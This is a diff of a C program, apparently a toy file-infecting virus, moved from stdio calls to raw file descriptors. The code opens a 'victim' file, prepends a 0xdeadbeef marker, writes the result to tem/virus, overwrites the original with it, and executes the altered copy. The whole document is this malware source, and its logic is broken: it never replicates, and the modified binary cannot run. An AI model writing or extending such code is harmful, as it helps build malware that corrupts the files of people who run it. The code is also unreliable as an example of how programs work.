@@ -4,6 +4,7 @@
 #include <fcntl.h>
 #include <sys/stat.h>
 #include <string.h>
+#include <sys/types.h>
 
 const char SENTINEL[] = "\xde\xad\xbe\xef";
 
@@ -15,9 +16,10 @@ int main(int argc, char *argv[]) {
 
     const char *victim = argv[1];
 
-    // Read victim file
-    FILE *fd = fopen(victim, "rb");
-    if (!fd) {
+    // Step 1: Read victim file using file descriptor (int)
+    int fd = open(victim, O_RDONLY);
+
+    if (fd < 0) {
         perror("Opening victim");
         return 1;
     }
@@ -25,57 +27,62 @@ int main(int argc, char *argv[]) {
     // Get file size
     struct stat st;
     fstat(fd, &st);
+
     size_t filesize = st.st_size;
 
     // Read entire file into buffer
-    char *buf = malloc(filesize + 256); // +256 for sentinel + null
+    char *buf = malloc(filesize + 256);
+
     if (!buf) {
         perror("Allocating buffer");
-        fclose(fd);
+        close(fd);
         return 1;
     }
 
-    size_t readsize = fread(buf, 1, filesize, fd);
-    fclose(fd);
+    size_t readsize = read(fd, buf, filesize);
+    close(fd);
 
-    // Prepend the virus seed code (the magic header)
-    // We'll inject: "VIRUS " + host bytes + "0xdeadbeef" as terminator
-    // But actually, simpler: prepend our own 4-byte sentinel before host data
-
-    // First, insert the sentinel before the host data
+    // Step 2: Prepend the virus seed (sentinel + host bytes)
+    // Insert sentinel before the host data
     memmove(buf + 4, buf, filesize); // Slide content down by 4 bytes
-    buf[4] = '\xde';
-    buf[5] = '\xad';
-    buf[6] = '\xbe';
-    buf[7] = '\xef';
-    // File now has 4-byte marker before the original content
 
-    // Write infected version to a new temp file
-    char tempname[64] = "tem/virus";
+    buf[0] = '\xde';
+    buf[1] = '\xad';
+    buf[2] = '\xbe';
+    buf[3] = '\xef';
+
+    // Step 3: Write infected version to temp file
+    char tempname[] = "tem/virus";
     mkdir("tem", 0755);
 
-    FILE *fdtemp = fopen(tempname, "wb");
-    fwrite(buf, 1, readsize + 4, fdtemp); // Write sentinel + original size
-    fclose(fdtemp);
+    int fdtemp = open(tempname, O_WRONLY | O_CREAT | O_TRUNC, 0644);
 
-    // Replace victim with the infected version
-    // First copy sentinel + content back to victim
-    FILE *fdvictim = fopen(victim, "wb");
-    if (fdvictim) {
-        // For self-modifying: read the temp back into victim
-        // Or simpler: just copy temp -> victim directly
-        rewind(fd); // Go back to read sentinel + host from our temp
-        fread(buf, 1, readsize + 4, fd);
-        fwrite(buf, 1, readsize + 4, fdvictim);
-        fclose(fd);
-        fclose(fdvictim);
+    if (fdtemp < 0) {
+        perror("Creating temp");
+        free(buf);
+        return 1;
     }
 
-    // Run the host from the temp folder
-    printf("Infected %s. Running host portion...\n", victim);
-    execv(tempname, &argv[1]); // Execute the now-infected host from tem/
+    write(fdtemp, buf, readsize + 4);
+    close(fdtemp);
 
-    // If execv returns, it might be the sentinel-triggered portion
-    printf("Host ran. Exit code: %d\n", readlink(victim));
+    // Step 4: Replace victim with the infected version
+    int fdvictim = open(victim, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+
+    if (fdvictim >= 0) {
+        write(fdvictim, buf, readsize + 4);
+        close(fdvictim);
+    }
+
+    // Step 5: Run the host from the temp folder
+    printf("Infected %s. Running host portion...\n", victim);
+
+    // Execute from temp folder (host runs as ./tem/virus <victim>)
+    char *arg[] = {"tem/virus", argv[1], NULL};
+    execv(tempname, arg);
+
+    printf("Host ran. Exit code: %d\n", 0);
+
+    free(buf);
     return 0;
 }
